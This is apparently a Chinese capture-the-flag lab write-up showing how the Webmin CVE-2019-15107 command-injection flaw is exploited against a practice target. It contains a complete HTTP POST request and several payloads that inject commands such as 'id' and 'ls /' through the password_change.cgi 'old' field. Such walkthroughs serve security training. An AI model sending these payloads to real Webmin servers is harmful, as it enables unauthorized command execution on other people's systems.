# webmin

## 1、访问靶场地址https://81.68.197.243:62201/session_login.cgi

![image-20220301164302790](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011643900.png)

## 2、百度搜索相关信息

可以看到是webmin的登录页面。我们在百度搜索关键词webmin 远程代码执行漏洞，可以看到编号为CVE-2019-15107

### 漏洞资料：

> #### Webmin 远程命令执行漏洞（CVE-2019-15107）
>
> Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。
>
> 参考链接：
>
> - https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
> - https://www.exploit-db.com/exploits/47230
> - https://blog.firosolutions.com/exploits/webmin/
>
> #### 环境搭建
>
> 执行如下命令，启动webmin 1.910：
>
> ```
> docker-compose up -d
> ```
>
> 执行完成后，访问`https://your-ip:10000`，忽略证书后即可看到webmin的登录页面。
>
> #### 漏洞复现
>
> 参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的user参数的值不是已知Linux用户的情况下（而参考链接中是`user=root`），才会进入到修改`/etc/shadow`的地方，触发命令注入漏洞。
>
> 发送如下数据包，即可执行命令`id`：
>
> ```
> POST /password_change.cgi HTTP/1.1
> Host: your-ip:10000
> Accept-Encoding: gzip, deflate
> Accept: */*
> Accept-Language: en
> User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
> Connection: close
> Cookie: redirect=1; testing=1; sid=x; sessiontest=1
> Referer: https://your-ip:10000/session_login.cgi
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 60
> 
> user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
> ```
>
> ![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011648841.png)
>
> 

## 3、CVE-2019-15107利用

登录任意账号密码后抓包，注意不要登录root用户

![image-20220301174832035](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011748123.png)

将请求包发送到repeater模块然后请求/password_change.cgi

post请求的数据改为

![image-20220301164528260](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011645373.png)

payload:

```
user=adad&pam=1&expired=2&old=ls /&new1=1111&new2=1111
```

### 4、查看flag

```
user=yeyu&pam=1&expired=2&old=ls /tmp/&new1=1111&new2=1111
```

![image-20220301164716310](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011647394.png)